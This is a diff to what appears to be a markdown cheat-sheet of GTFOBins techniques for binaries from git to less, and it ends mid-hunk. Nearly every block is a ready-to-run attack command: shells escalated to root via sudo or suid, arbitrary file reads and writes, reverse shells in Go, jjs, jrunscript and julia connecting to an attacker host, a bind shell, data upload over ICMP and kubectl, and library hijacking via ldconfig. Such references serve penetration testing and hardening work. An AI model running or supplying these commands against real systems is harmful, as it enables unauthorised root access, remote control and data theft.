@@ -3779,7 +3843,7 @@ ginsh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins git shell #1 (sudo / unprivileged)"
 PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
 ```
 <!-- cheat
@@ -3789,7 +3853,7 @@ PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
 
 Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins git shell #2 (sudo / unprivileged)"
 git init .
 echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
 chmod +x .git/hooks/pre-commit
@@ -3802,7 +3866,7 @@ git -C . commit --allow-empty -m x
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins git shell #3 (sudo / suid / unprivileged)"
 ln -s /bin/sh git-x
 git --exec-path=. x
 ```
@@ -3811,7 +3875,9 @@ git --exec-path=. x
 
 #### git shell #3 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins git shell #3 - suid override (suid variant)"
 ln -s /bin/sh git-x
 git --exec-path=. x -p
 ```
@@ -3822,7 +3888,7 @@ git --exec-path=. x -p
 
 The read file content is displayed in `diff` style output format.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins git file-read (sudo / suid / unprivileged)"
 git diff /dev/null $file_in
 ```
 <!-- cheat
@@ -3833,7 +3899,7 @@ var file_in
 
 The patch can be created locally by creating the file that will be written on the target using its absolute path:  ``` echo $data >$file_in git diff /dev/null $file_in >x.patch ```
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins git file-write (sudo / suid / unprivileged)"
 git apply --unsafe-paths --directory / x.patch
 ```
 <!-- cheat
@@ -3843,7 +3909,7 @@ git apply --unsafe-paths --directory / x.patch
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins git inherit #1 (inherits from less) (sudo / unprivileged)"
 git help config
 ```
 <!-- cheat
@@ -3853,7 +3919,7 @@ git help config
 
 The help system can also be reached from any `git` command, e.g., `git branch`.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins git inherit #2 (inherits from less) (sudo / unprivileged)"
 git branch --help config
 !/bin/sh
 ```
@@ -3866,7 +3932,7 @@ git branch --help config
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gnuplot shell (sudo / suid / unprivileged)"
 gnuplot -e 'system("/bin/sh 1>&0")'
 ```
 <!-- cheat
@@ -3878,7 +3944,7 @@ gnuplot -e 'system("/bin/sh 1>&0")'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins go shell (sudo / unprivileged)"
 echo -e 'package main\nimport "syscall"\nfunc main(){\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\n}' >$tmp_file
 go run $tmp_file
 ```
@@ -3890,7 +3956,7 @@ var tmp_file
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins go reverse-shell (sudo / unprivileged)"
 echo -e 'package main\nimport (\n\t"os"\n\t"net"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP("$lhost").To4()\n\taddr := &syscall.SockaddrInet4{Port: $lport}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >$tmp_file
 go run $tmp_file
 ```
@@ -3904,7 +3970,7 @@ var tmp_file
 
 Bind a shell to a local port for the attacker to connect to.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins go bind-shell (sudo / unprivileged)"
 echo -e 'package main\nimport (\n\t"os"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: $lport}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >$tmp_file
 go run $tmp_file
 ```
@@ -3917,7 +3983,7 @@ var tmp_file
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins go file-read (sudo / unprivileged)"
 echo -e 'package main\nimport (\n\t"fmt"\n\t"os"\n)\n\nfunc main(){\n\tb, _ := os.ReadFile("$file_in")\n\tfmt.Print(string(b))\n}' >$tmp_file
 go run $tmp_file
 ```
@@ -3930,7 +3996,7 @@ var tmp_file
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins go file-write (sudo / unprivileged)"
 echo -e 'package main\nimport "os"\nfunc main(){\n\tf, _ := os.OpenFile("$file_out", os.O_RDWR|os.O_CREATE, 0644)\n\tf.Write([]byte("$data\\n"))\n\tf.Close()\n}' >$tmp_file
 go run $tmp_file
 ```
@@ -3946,7 +4012,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins grc shell (sudo / unprivileged)"
 grc --pty /bin/sh
 ```
 <!-- cheat
@@ -3958,7 +4024,7 @@ grc --pty /bin/sh
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins grep file-read (sudo / suid / unprivileged)"
 grep '' $file_in
 ```
 <!-- cheat
@@ -3971,7 +4037,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gtester shell (sudo / suid / unprivileged)"
 echo 'exec /bin/sh 0<&1' >$tmp_file
 chmod +x $tmp_file
 gtester -q $tmp_file
@@ -3982,7 +4048,9 @@ var tmp_file
 
 #### gtester shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins gtester shell - suid override (suid variant)"
 echo '#!/bin/sh -p' >$tmp_file
 echo 'exec /bin/sh -p 0<&1' >>$tmp_file
 chmod +x $tmp_file
@@ -3996,7 +4064,7 @@ var tmp_file
 
 Data to be written appears in an XML attribute in the output file (`<testbinary path="$data">`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gtester file-write (sudo / suid / unprivileged)"
 gtester $data -o $file_out
 ```
 <!-- cheat
@@ -4010,7 +4078,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins guile shell (sudo / suid / unprivileged)"
 guile -c '(system "/bin/sh")'
 ```
 <!-- cheat
@@ -4024,7 +4092,7 @@ There are also a number of other utilities that rely on `gzip` under the hood, e
 
 Read the contents of an arbitrary file.
 
-```sh title:"capabilities / sudo / suid / unprivileged"
+```sh title:"GTFOBins gzip file-read (capabilities / sudo / suid / unprivileged)"
 gzip -c $file_in | gzip -d
 ```
 <!-- cheat
@@ -4037,7 +4105,7 @@ var file_in
 
 Append data to the end of the output file, creating if does not exist.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins hashcat file-write (sudo / unprivileged)"
 echo -n $data | tee $wordlist | md5sum | awk '{print $1}' >$hash_file
 hashcat -m 0 --quiet --potfile-disable -o $file_out --outfile-format=2 --outfile-autohex-disable $hash_file $wordlist
 ```
@@ -4058,7 +4126,7 @@ Alias of [hexdump](#hexdump). All techniques from `hexdump` apply.
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins head file-read (sudo / suid / unprivileged)"
 head -c-0 $file_in
 ```
 <!-- cheat
@@ -4071,7 +4139,7 @@ var file_in
 
 The output is actually an hex dump.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins hexdump file-read (sudo / suid / unprivileged)"
 hd $file_in
 ```
 <!-- cheat
@@ -4084,7 +4152,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins hg shell (sudo / suid / unprivileged)"
 hg --config alias.x='!/bin/sh' x
 ```
 <!-- cheat
@@ -4096,7 +4164,7 @@ hg --config alias.x='!/bin/sh' x
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins highlight file-read (sudo / suid / unprivileged)"
 highlight --no-doc --failsafe $file_in
 ```
 <!-- cheat
@@ -4109,7 +4177,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins hping3 shell (sudo / suid / unprivileged)"
 hping3
 /bin/sh
 ```
@@ -4118,7 +4186,9 @@ hping3
 
 #### hping3 shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins hping3 shell - suid override (suid variant)"
 hping3
 /bin/sh -p
 ```
@@ -4129,7 +4199,7 @@ hping3
 
 The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals when the file reached the end.
 
-```sh title:"sudo"
+```sh title:"GTFOBins hping3 upload (sudo)"
 hping3 $lhost --icmp --data 999 --sign xxx --file $file_in
 ```
 <!-- cheat
@@ -4145,7 +4215,7 @@ The `8859_1` encoding is used as it accepts any single-byte sequence, thus it al
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins iconv file-read (sudo / suid / unprivileged)"
 iconv -f 8859_1 -t 8859_1 $file_in
 ```
 <!-- cheat
@@ -4156,7 +4226,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins iconv file-write (sudo / suid / unprivileged)"
 echo $data | iconv -f 8859_1 -t 8859_1 -o $file_out
 ```
 <!-- cheat
@@ -4170,7 +4240,7 @@ var file_out
 
 This requires the privilege to capture on some device (specify with `-i` if needed).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins iftop shell (sudo / suid / unprivileged)"
 iftop
 !/bin/sh
 ```
@@ -4183,7 +4253,7 @@ iftop
 
 This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins install privilege-escalation (sudo / suid)"
 install -m 6777 $file_in $dir_out/
 ```
 <!-- cheat
@@ -4197,7 +4267,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ionice shell (sudo / suid / unprivileged)"
 ionice /bin/sh
 ```
 <!-- cheat
@@ -4205,7 +4275,9 @@ ionice /bin/sh
 
 #### ionice shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins ionice shell - suid override (suid variant)"
 ionice /bin/sh -p
 ```
 <!-- cheat
@@ -4217,7 +4289,7 @@ ionice /bin/sh -p
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins ip shell #1 (sudo / suid)"
 ip netns add foo
 ip netns exec foo /bin/sh
 ip netns delete foo
@@ -4227,7 +4299,9 @@ ip netns delete foo
 
 #### ip shell #1 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins ip shell #1 - suid override (suid variant)"
 ip netns add foo
 ip netns exec foo /bin/sh -p
 ip netns delete foo
@@ -4239,7 +4313,7 @@ ip netns delete foo
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins ip shell #2 (sudo)"
 ip netns add foo
 ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
 ip netns exec bar /bin/sh
@@ -4253,7 +4327,7 @@ ip netns delete bar
 
 The read file content is corrupted by error prints.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ip file-read (sudo / suid / unprivileged)"
 ip -force -batch $file_in
 ```
 <!-- cheat
@@ -4266,7 +4340,7 @@ var file_in
 
 The content is written along with a number of `iptables` rules.
 
-```sh title:"sudo"
+```sh title:"GTFOBins iptables-save file-write (sudo)"
 iptables -A INPUT -i lo -j ACCEPT -m comment --comment $data
 iptables -S
 iptables-save -f $file_out
@@ -4282,7 +4356,7 @@ var file_out
 
 This allows to run Ruby code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins irb inherit (inherits from ruby) (sudo / unprivileged)"
 irb
 ...
 ```
@@ -4295,7 +4369,7 @@ irb
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ispell shell (sudo / suid / unprivileged)"
 ispell /etc/hosts
 !/bin/sh
 ```
@@ -4304,7 +4378,9 @@ ispell /etc/hosts
 
 #### ispell shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins ispell shell - suid override (suid variant)"
 ispell /etc/hosts
 !/bin/sh -p
 ```
@@ -4317,7 +4393,7 @@ ispell /etc/hosts
 
 The `Shell.class` class file can be compiled offline, then uploaded to the target:  ``` cat >Shell.java <<EOF public class Shell {     public static void main(String[] args) throws Exception {         new ProcessBuilder("/bin/sh").inheritIO().start().waitFor();     } } EOF  javac Shell.java ```
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins java shell (sudo / unprivileged)"
 java Shell
 ```
 <!-- cheat
@@ -4331,7 +4407,7 @@ This tool is installed starting with Java SE 8.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jjs shell (sudo / unprivileged)"
 jjs
 Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()
 ```
@@ -4342,7 +4418,7 @@ Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </d
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jjs reverse-shell (sudo / unprivileged)"
 jjs
 var host='$lhost';
 var port=$lport;
@@ -4362,7 +4438,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jjs file-read (sudo / unprivileged)"
 jjs
 var BufferedReader = Java.type('java.io.BufferedReader');
 var FileReader = Java.type('java.io.FileReader');
@@ -4377,7 +4453,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jjs file-write (sudo / unprivileged)"
 jjs
 var FileWriter = Java.type('java.io.FileWriter');
 var fw=new FileWriter('$file_out');
@@ -4393,7 +4469,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jjs download (sudo / unprivileged)"
 jjs
 var URL = Java.type('java.net.URL');
 var ws = new URL('$scheme://$lhost$file_in');
@@ -4418,7 +4494,7 @@ var file_out
 
 The terminal is spawn int the terminal interface.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins joe shell (sudo / suid / unprivileged)"
 joe
 ^K!/bin/sh
 ```
@@ -4431,7 +4507,7 @@ joe
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins join file-read (sudo / suid / unprivileged)"
 join -a 2 /dev/null $file_in
 ```
 <!-- cheat
@@ -4446,7 +4522,7 @@ This might not work if run by unprivileged users depending on the system configu
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins journalctl inherit (inherits from less) (sudo / unprivileged)"
 journalctl
 ```
 <!-- cheat
@@ -4458,7 +4534,7 @@ journalctl
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins jq file-read (sudo / suid / unprivileged)"
 jq -Rr . $file_in
 ```
 <!-- cheat
@@ -4473,7 +4549,7 @@ This tool is installed starting with Java SE 6.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins jrunscript shell (sudo / suid / unprivileged)"
 jrunscript -e 'exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'
 ```
 <!-- cheat
@@ -4483,7 +4559,7 @@ jrunscript -e 'exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")
 
 This has been found working in macOS but failing on Linux systems.
 
-```sh title:"suid variant"
+```sh title:"GTFOBins jrunscript shell - suid override (suid variant)"
 jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'
 ```
 <!-- cheat
@@ -4493,7 +4569,7 @@ jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jrunscript reverse-shell (sudo / unprivileged)"
 jrunscript -e 'var host="$lhost";
     var port=$lport;
     var p=new java.lang.ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
@@ -4516,7 +4592,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jrunscript file-read (sudo / unprivileged)"
 jrunscript -e 'br = new BufferedReader(new java.io.FileReader("$file_in"));
     while ((line = br.readLine()) != null) { print(line); }'
 ```
@@ -4528,7 +4604,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jrunscript file-write (sudo / unprivileged)"
 jrunscript -e 'var fw=new java.io.FileWriter("$file_out");
     fw.write("$data");
     fw.close();'
@@ -4542,7 +4618,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jrunscript download (sudo / unprivileged)"
 jrunscript -e 'cp("$scheme://$lhost$file_in","$file_out")'
 ```
 <!-- cheat
@@ -4558,7 +4634,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jshell shell (sudo / unprivileged)"
 jshell
 Runtime.getRuntime().exec("$cmd_file");
 ```
@@ -4570,7 +4646,7 @@ var cmd_file
 
 The content is leaked as error messages.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jshell file-read (sudo / unprivileged)"
 jshell
 jshell> /open $file_in
 ```
@@ -4582,7 +4658,7 @@ var file_in
 
 Writes only the valid Java code to file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jshell file-write (sudo / unprivileged)"
 jshell
 String x = "$data";
 /save $file_out
@@ -4598,7 +4674,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins jtag shell (sudo / unprivileged)"
 jtag --interactive
 shell /bin/sh
 ```
@@ -4611,7 +4687,7 @@ shell /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins julia shell (sudo / suid / unprivileged)"
 julia -e 'run(`/bin/sh`)'
 ```
 <!-- cheat
@@ -4619,7 +4695,9 @@ julia -e 'run(`/bin/sh`)'
 
 #### julia shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins julia shell - suid override (suid variant)"
 julia -e 'run(`/bin/sh -p`)'
 ```
 <!-- cheat
@@ -4629,7 +4707,7 @@ julia -e 'run(`/bin/sh -p`)'
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins julia reverse-shell (sudo / suid / unprivileged)"
 julia -e 'using Sockets; sock=connect("$lhost", parse(Int64, $lport)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
 ```
 <!-- cheat
@@ -4641,7 +4719,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins julia file-read (sudo / suid / unprivileged)"
 julia -e 'print(open(f->read(f, String), "$file_in"))'
 ```
 <!-- cheat
@@ -4652,7 +4730,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins julia file-write (sudo / suid / unprivileged)"
 julia -e 'open(f->write(f, "$data"), $file_out, "w")'
 ```
 <!-- cheat
@@ -4664,7 +4742,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins julia download (sudo / suid / unprivileged)"
 julia -e 'download("$scheme://$lhost$file_in", "$file_out")'
 ```
 <!-- cheat
@@ -4680,7 +4758,7 @@ var file_out
 
 This allows to run Ruby code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins knife inherit (inherits from ruby) (sudo / unprivileged)"
 knife exec -E '...'
 ```
 <!-- cheat
@@ -4696,7 +4774,7 @@ Alias of [bash](#bash). All techniques from `bash` apply.
 
 Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ksshell file-read (sudo / suid / unprivileged)"
 ksshell -i $file_in
 ```
 <!-- cheat
@@ -4709,7 +4787,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins ksu shell (sudo)"
 ksu -q -e /bin/sh
 ```
 <!-- cheat
@@ -4721,7 +4799,7 @@ ksu -q -e /bin/sh
 
 The shell is spawn multiple times.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins kubectl shell (sudo / unprivileged)"
 cat >$tmp_file <<EOF
 clusters:
 - cluster:
@@ -4755,7 +4833,7 @@ var tmp_file
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins kubectl upload (sudo / suid / unprivileged)"
 kubectl proxy --address=0.0.0.0 --port=$lport --www=$dir/ --www-prefix=/x/
 ```
 <!-- cheat
@@ -4769,7 +4847,7 @@ var dir
 
 The output might be corrupted or incomplete if the file does not follow the expected database format.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins last file-read (sudo / suid / unprivileged)"
 last -a -f $file_in
 ```
 <!-- cheat
@@ -4786,7 +4864,7 @@ Alias of [last](#last). All techniques from `last` apply.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins latex shell (sudo / suid / unprivileged)"
 latex --shell-escape '\immediate\write18{/bin/sh}'
 ```
 <!-- cheat
@@ -4796,7 +4874,7 @@ latex --shell-escape '\immediate\write18{/bin/sh}'
 
 The read file will be part of the PDF output.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins latex file-read (sudo / suid / unprivileged)"
 latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{$file_in}\end{document}'
 strings texput.dvi
 ```
@@ -4808,7 +4886,7 @@ var file_in
 
 The file can only be written in the current directory, and the `.tex` extension is mandatory.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins latex file-write (sudo / suid / unprivileged)"
 latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{$data}\immediate\closeout\tempfile\end{document}'
 ```
 <!-- cheat
@@ -4821,7 +4899,7 @@ var data
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins latexmk shell (sudo / unprivileged)"
 latexmk -pdf -pdflatex='/bin/sh #' /dev/null
 ```
 <!-- cheat
@@ -4831,7 +4909,7 @@ latexmk -pdf -pdflatex='/bin/sh #' /dev/null
 
 The read file will be part of the output.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins latexmk file-read (sudo / unprivileged)"
 echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{$file_in}\end{document}' >$tmp_file
 latexmk -dvi $tmp_file
 strings temp-file.dvi
@@ -4845,7 +4923,7 @@ var tmp_file
 
 This allows to run Perl code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins latexmk inherit (inherits from perl) (sudo / unprivileged)"
 latexmk -e '...'
 ```
 <!-- cheat
@@ -4859,7 +4937,7 @@ latexmk -e '...'
 
 The spawned process will be the loader, not the target executable, this might aid evasion. See <https://shyft.us/posts/20230526_linux_command_proxy.html> for more information.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ld.so shell (sudo / suid / unprivileged)"
 $ld_so /bin/sh
 ```
 <!-- cheat
@@ -4868,7 +4946,9 @@ var ld_so
 
 #### ld.so shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins ld.so shell - suid override (suid variant)"
 $ld_so /bin/sh -p
 ```
 <!-- cheat
@@ -4881,7 +4961,7 @@ var ld_so
 
 This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system.  First identify the shared libraries used by the target program, for example:  ``` $ ldd /bin/ping | grep libcap         libcap.so.2 => $tmp_dir/libcap.so.2 (0x00007f8417eef000) ```  Then create the shared library override, named `libcap.so.2`, and put in in `$tmp_dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ldconfig library-load (sudo / suid / unprivileged)"
 echo $tmp_dir/ >$tmp_file
 ldconfig -f $tmp_file
 ping
@@ -4897,7 +4977,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins less shell #1 (sudo / suid / unprivileged)"
 less /etc/hosts
 !/bin/sh
 ```
@@ -4908,7 +4988,7 @@ less /etc/hosts
 
 The optional `reset` command is needed to receive the echo back of the typed keystrokes.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins less shell #2 (sudo / unprivileged)"
 LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
 reset
 ```
@@ -4919,7 +4999,7 @@ reset
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins less shell #3 (sudo / unprivileged)"
 VISUAL='/bin/sh -s --' less /etc/hosts
 v
 ```
@@ -4930,7 +5010,7 @@ v
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"unprivileged"
+```sh title:"GTFOBins less command #1 (unprivileged)"
 cp $cmd_file ~/.lessfilter
 less /etc/hosts
 ```
@@ -4942,7 +5022,7 @@ var cmd_file
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins less command #2 (sudo / unprivileged)"
 LESSOPEN='$cmd_file # %s' less /etc/hosts
 ```
 <!-- cheat
@@ -4953,7 +5033,7 @@ var cmd_file
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins less file-read #1 (sudo / suid / unprivileged)"
 less $file_in
 ```
 <!-- cheat
@@ -4964,7 +5044,7 @@ var file_in
 
 This can be used to read another file, e.g., when invoked as a pager with some fixed content.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins less file-read #2 (sudo / suid / unprivileged)"
 less /etc/hosts
 :e $file_in
 ```
@@ -4976,7 +5056,7 @@ var file_in
 
 This can be used to read another file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins less file-read #3 (sudo / unprivileged)"
 LESSOPEN='echo $file_in # %s' less /etc/hosts
 ```
 <!-- cheat
@@ -4987,7 +5067,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins less file-write (sudo / suid / unprivileged)"
 echo $data | less
 s$file_out
 q
@@ -5001,7 +5081,7 @@ var file_out
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins less inherit (inherits from vi) (sudo / suid / unprivileged)"
 less /etc/hosts
 v
 ```
@@ -5014,7 +5094,7 @@ v
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
